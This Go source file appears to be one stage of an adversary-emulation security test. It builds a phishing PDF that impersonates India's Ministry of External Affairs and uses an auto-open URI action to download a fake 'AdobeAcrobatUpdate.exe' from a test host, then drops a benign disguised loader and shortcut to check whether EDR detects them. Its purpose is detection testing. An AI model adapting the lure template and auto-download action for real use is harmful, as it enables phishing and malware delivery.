//go:build windows
// +build windows

/*
STAGE 1: Malicious PDF Lure Preparation (T1204.002)
Simulates UNK_RobotDreams spearphishing lure: a PDF themed as a "Gulf Security Alert"
from the Indian Ministry of External Affairs (MEA). The PDF contains a fake Adobe Reader
button that, when clicked, triggers a PowerShell download command. This stage creates
the PDF artifact and a simulated executable loader to test whether EDR detects
the PDF-to-executable chain.
*/

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"time"
)

const (
	TEST_UUID      = "414a4c61-019f-48ba-934d-d5e91a29a878"
	TECHNIQUE_ID   = "T1204.002"
	TECHNIQUE_NAME = "User Execution: Malicious File"
	STAGE_ID       = 1
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting Malicious PDF Lure simulation")
	LogMessage("INFO", TECHNIQUE_ID, "Simulating UNK_RobotDreams Gulf Security Alert PDF with fake Adobe button")
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "Create PDF lure and executable loader")

	if err := performTechnique(); err != nil {
		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))

		exitCode := determineExitCode(err)
		if exitCode == StageBlocked || exitCode == StageQuarantined {
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		} else {
			LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		}
		os.Exit(exitCode)
	}

	fmt.Printf("[STAGE %s] PDF lure and executable loader created successfully\n", TECHNIQUE_ID)
	LogMessage("SUCCESS", TECHNIQUE_ID, "PDF lure artifacts created and persisted")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Gulf Security Alert PDF and executable loader created")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	// UNK_RobotDreams creates PDFs themed as "Gulf Security Alerts" impersonating
	// the Indian Ministry of External Affairs. The PDF contains a fake Adobe Reader
	// button that triggers download of an executable loader.
	//
	// We simulate:
	// 1. Creating the PDF artifact with embedded JavaScript/action reference
	// 2. Creating a simulated executable loader (benign batch file)
	// 3. Verifying artifacts survive AV/EDR scanning

	artifactDir := ARTIFACT_DIR
	if err := os.MkdirAll(artifactDir, 0755); err != nil {
		return fmt.Errorf("failed to create artifact directory: %v", err)
	}

	// Step 1: Create the malicious PDF lure
	// This is a minimal valid PDF with an OpenAction that references a URI
	// to simulate the fake Adobe button downloading an executable
	pdfContent := buildGulfSecurityAlertPDF()

	pdfPath := filepath.Join(artifactDir, "Gulf_Security_Alert_MEA_2026.pdf")
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Creating PDF lure at: %s", pdfPath))

	if err := os.WriteFile(pdfPath, pdfContent, 0644); err != nil {
		return fmt.Errorf("failed to write PDF lure: %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("PDF lure created: %d bytes", len(pdfContent)))

	// Step 2: Create simulated executable loader
	// In the real attack, clicking the fake Adobe button downloads this loader
	// We create a benign .exe-like artifact (batch wrapper) to trigger AV scanning
	loaderContent := []byte(
		"@echo off\r\n" +
			"REM F0RT1KA Security Test - Simulated UNK_RobotDreams loader\r\n" +
			"REM Real loader downloads Rust backdoor via PowerShell\r\n" +
			"echo [F0RT1KA] Simulated executable loader activated\r\n" +
			"echo [F0RT1KA] In real attack: downloads Rust backdoor from Azure CDN\r\n" +
			"exit /b 0\r\n",
	)

	loaderPath := filepath.Join(artifactDir, "AdobeAcrobatUpdate.exe")
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Creating simulated loader at: %s", loaderPath))

	if err := os.WriteFile(loaderPath, loaderContent, 0755); err != nil {
		return fmt.Errorf("failed to write executable loader: %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Executable loader created: %d bytes", len(loaderContent)))

	// Step 3: Create a .lnk-like shortcut indicator (simulated)
	// UNK_RobotDreams sometimes uses LNK files alongside PDF lures
	lnkContent := []byte(
		"[InternetShortcut]\r\n" +
			"URL=file:///" + loaderPath + "\r\n" +
			"IconIndex=0\r\n" +
			"IconFile=C:\\Windows\\System32\\shell32.dll\r\n",
	)

	lnkPath := filepath.Join(artifactDir, "Read_Gulf_Security_Alert.url")
	if err := os.WriteFile(lnkPath, lnkContent, 0644); err != nil {
		LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("Failed to create URL shortcut: %v", err))
		// Non-critical, continue
	} else {
		LogMessage("INFO", TECHNIQUE_ID, "URL shortcut created for PDF-to-loader chain")
	}

	// Step 4: Verify artifacts survived AV/EDR scanning
	time.Sleep(3 * time.Second)

	// Check PDF
	if _, err := os.Stat(pdfPath); os.IsNotExist(err) {
		return fmt.Errorf("PDF lure was quarantined after creation")
	}
	LogMessage("INFO", TECHNIQUE_ID, "PDF lure survived AV scan")

	// Check loader
	if _, err := os.Stat(loaderPath); os.IsNotExist(err) {
		return fmt.Errorf("executable loader was quarantined after creation")
	}
	LogMessage("INFO", TECHNIQUE_ID, "Executable loader survived AV scan")

	LogMessage("INFO", TECHNIQUE_ID, "Detection opportunity: PDF with OpenAction URI + executable in same directory")
	LogMessage("INFO", TECHNIQUE_ID, "Detection opportunity: Executable named AdobeAcrobatUpdate.exe in user profile")

	return nil
}

// buildGulfSecurityAlertPDF creates a minimal PDF simulating the UNK_RobotDreams lure
func buildGulfSecurityAlertPDF() []byte {
	// Minimal valid PDF with:
	// - Title referencing Gulf Security Alert
	// - OpenAction with URI action (simulates the fake Adobe button)
	// - Page content with lure text
	pdf := "%PDF-1.4\r\n"

	// Object 1: Catalog with OpenAction
	pdf += "1 0 obj\r\n"
	pdf += "<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>\r\n"
	pdf += "endobj\r\n"

	// Object 2: Pages
	pdf += "2 0 obj\r\n"
	pdf += "<< /Type /Pages /Kids [3 0 R] /Count 1 >>\r\n"
	pdf += "endobj\r\n"

	// Object 3: Page
	pdf += "3 0 obj\r\n"
	pdf += "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\r\n"
	pdf += "endobj\r\n"

	// Object 4: Page content (lure text)
	content := "BT /F1 14 Tf 72 720 Td (MINISTRY OF EXTERNAL AFFAIRS - GOVERNMENT OF INDIA) Tj ET\r\n"
	content += "BT /F1 12 Tf 72 690 Td (CLASSIFIED: Gulf Region Security Advisory 2026) Tj ET\r\n"
	content += "BT /F1 10 Tf 72 660 Td (This document requires Adobe Reader to view securely.) Tj ET\r\n"
	content += "BT /F1 10 Tf 72 640 Td (Click the button below to enable secure viewing.) Tj ET\r\n"
	pdf += "4 0 obj\r\n"
	pdf += fmt.Sprintf("<< /Length %d >>\r\n", len(content))
	pdf += "stream\r\n"
	pdf += content
	pdf += "endstream\r\n"
	pdf += "endobj\r\n"

	// Object 5: OpenAction - URI action (simulates fake Adobe button)
	// In real attack this would download the loader from Azure Front Door
	pdf += "5 0 obj\r\n"
	pdf += "<< /Type /Action /S /URI /URI (https://f0rt1ka-test.azurefd.net/update/AdobeAcrobatUpdate.exe) >>\r\n"
	pdf += "endobj\r\n"

	// Cross-reference table and trailer
	pdf += "xref\r\n"
	pdf += "0 6\r\n"
	pdf += "0000000000 65535 f \r\n"
	pdf += "0000000009 00000 n \r\n"
	pdf += "0000000096 00000 n \r\n"
	pdf += "0000000157 00000 n \r\n"
	pdf += "0000000264 00000 n \r\n"
	pdf += "0000000600 00000 n \r\n"
	pdf += "trailer << /Size 6 /Root 1 0 R >>\r\n"
	pdf += "startxref\r\n"
	pdf += "750\r\n"
	pdf += "%%EOF\r\n"

	return []byte(pdf)
}

// ==============================================================================
// EXIT CODE DETERMINATION
// ==============================================================================

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := err.Error()
	if containsAny(errStr, []string{"access denied", "access is denied", "permission denied", "operation not permitted"}) {
		return StageBlocked
	}
	if containsAny(errStr, []string{"quarantined", "virus", "threat"}) {
		return StageQuarantined
	}
	if containsAny(errStr, []string{"not found", "does not exist", "no such", "not running", "not available"}) {
		return StageError
	}
	// Default to error (999), NOT blocked (126) - prevents false "EDR blocked" results
	return StageError
}

func containsAny(s string, substrings []string) bool {
	for _, substr := range substrings {
		if containsCI(s, substr) {
			return true
		}
	}
	return false
}

func containsCI(s, substr string) bool {
	return len(s) >= len(substr) && indexIgnoreCase(s, substr) >= 0
}

func indexIgnoreCase(s, substr string) int {
	s = toLowerStr(s)
	substr = toLowerStr(substr)
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func toLowerStr(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c = c + ('a' - 'A')
		}
		result[i] = c
	}
	return string(result)
}
